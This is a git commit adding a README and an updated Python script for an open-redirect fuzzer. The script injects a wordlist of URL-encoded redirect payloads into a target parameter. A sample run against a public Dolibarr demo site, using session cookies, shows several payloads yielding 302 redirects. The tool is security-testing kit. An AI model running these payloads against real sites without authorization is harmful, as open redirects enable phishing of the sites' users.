4a56ae2aaf623637b34d46bcc08cc6f288cc2a45
xanhacks <xanhacks@protonmail.com>
2022-02-04 22:06:01 +0100

    add v1

---
+++ README.md
@@ -0,0 +1,56 @@
+# OpenRedirect Fuzzer
+
+## Installation
+
+```bash
+$ git clone https://github.com/xanhacks/openredirect-fuzzer
+$ cd openredirect-fuzzer
+$ python3 -m pip install -r requirements.txt
+```
+
+## Usage
+
+Basic example
+
+```bash
+$ python3 fuzzer.py -u 'https://example.com/login?redirect=FUZZ' -w payloads/open-redirect-payload-list.lst --cookies 'session=abcd'
+```
+
+Practical example :
+
+```bash
+$ python3 fuzzer.py -u 'https://preview2.dolibarr.org/accountancy/admin/card.php?backtopage=FUZZ&cancel=a' -w payloads/
+open-redirect-payload-list.lst --cookies 'DOLUSERCOOKIE_boxfilter_task=all; DOLSESSID_e2cecaf5782bec0de940a8a55e2029e7=a6h19pkt4cgsp72nlffo2sq249; DOLSESSTIMEOU
+T_e2cecaf5782bec0de940a8a55e2029e7=2000' --proxy 'http://127.0.0.1:8080'
+Start fuzzing ...
+Try payload : /%09/example.com
+=> Error - Invalid schema
+
+Try payload : /%2f%2fexample.com
+=> 302 | Location : example.com, new URL : https://preview2.dolibarr.org/accountancy/admin/example.com
+
+Try payload : /%2f%2f%2fbing.com%2f%3fwww.omise.co
+=> 302 | Location : bing.com/?www.omise.co, new URL : https://preview2.dolibarr.org/accountancy/admin/bing.com/?www.omise.co
+
+Try payload : /%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
+=> 302 | Location : google.com/, new URL : https://preview2.dolibarr.org/accountancy/admin/google.com/
+
+Try payload : /%5cexample.com
+=> 302 | Location : example.com, new URL : https://preview2.dolibarr.org/accountancy/admin/example.com
+
+Try payload : /%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
+=> 302 | Location : /http//google.com, new URL : https://preview2.dolibarr.org/http//google.com
+
+Try payload : /.example.com
+=> 302 | Location : /.example.com, new URL : https://preview2.dolibarr.org/.example.com
+
+Try payload : //%09/example.com
+=> 302 | Location : /example.com, new URL : https://preview2.dolibarr.org/example.com
+
+Try payload : //%5cexample.com
+=> 302 | Location : example.com, new URL : https://preview2.dolibarr.org/accountancy/admin/example.com
+
+Try payload : ///%09/example.com
+=> 302 | Location : /example.com, new URL : https://preview2.dolibarr.org/example.com
+[...]
+```
--- fuzzer.py
+++ fuzzer.py
@@ -1,28 +1,54 @@
 #!/usr/bin/env python3
 import argparse
+from urllib.parse import urlparse
+from urllib3 import disable_warnings
+from urllib3.exceptions import InsecureRequestWarning
 
-from request import get
+from requests import get
+from requests.exceptions import InvalidSchema
 
 
-def fuzz(url, wordlist_path, cookies):
+disable_warnings(InsecureRequestWarning)
+
+
+def fuzz(url, wordlist_path, cookies, http_proxy):
 	headers = {
 		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246'
 	}
-	if cookies: headers['Cookies'] = cookies
+	proxies = {}
+
+	if cookies:
+		headers['Cookie'] = cookies
+	if http_proxy:
+		proxies['http'] = http_proxy
+		proxies['https'] = http_proxy
 
 	with open(wordlist_path, "r") as wordlist:
 		for word in wordlist:
 			payload = word.rstrip()
-			
-			target_url = url.replace('FUZZ', payload)
-			req = get(target_url, headers=headers)
 
-			if req.history:
-				history_status = req.history[0].status_code
-				history_headers = req.history[0].headers
-				location = history_headers['Location'] if 'Location' in history_headers else ""
-				print(f"[{history_status}] Location : {location}, new URL : {req.url}, payload : {payload}")
-			print(f"[No redirection - {req.status_code}] URL : {req.url}, payload : {payload}")
+			print("Try payload :", payload)
+			try:
+				target_url = url.replace('FUZZ', payload)
+				req = get(target_url, headers=headers, proxies=proxies, verify=False)
+
+				if req.history:
+					history_status = req.history[0].status_code
+					history_headers = req.history[0].headers
+					location = history_headers['Location'] if 'Location' in history_headers else ""
+					print(f"=> {history_status} | Location : {location}, new URL : {req.url}")
+
+					if urlparse(req.url).netloc != original_domain:
+						print("=> Redirected to another domain !\n")
+						break
+					print()
+				else:
+					print(f"=> No redirection - {req.status_code} | URL : {req.url}\n")
+			except InvalidSchema:
+				print(f"=> Error - Invalid schema\n")
+			except KeyboardInterrupt:
+				print("\nExiting ...")
+				break
 
 
 if __name__ == "__main__":
@@ -31,8 +57,10 @@ if __name__ == "__main__":
 	parser.add_argument('-u', '--url', help='URL to attack (replace target parameter value by FUZZ).')
 	parser.add_argument('-w', '--wordlist', help='Path to payload list file.')
 	parser.add_argument('-c', '--cookies', help='Add cookies to all the requests.')
+	parser.add_argument('-p', '--proxy', help='Set a proxy to all the requests.')
 
 	args = parser.parse_args()
 
+	original_domain = urlparse(args.url).netloc
 	print("Start fuzzing ...")
-	fuzz(args.url, args.wordlist, args.cookies)
+	fuzz(args.url, args.wordlist, args.cookies, args.proxy)
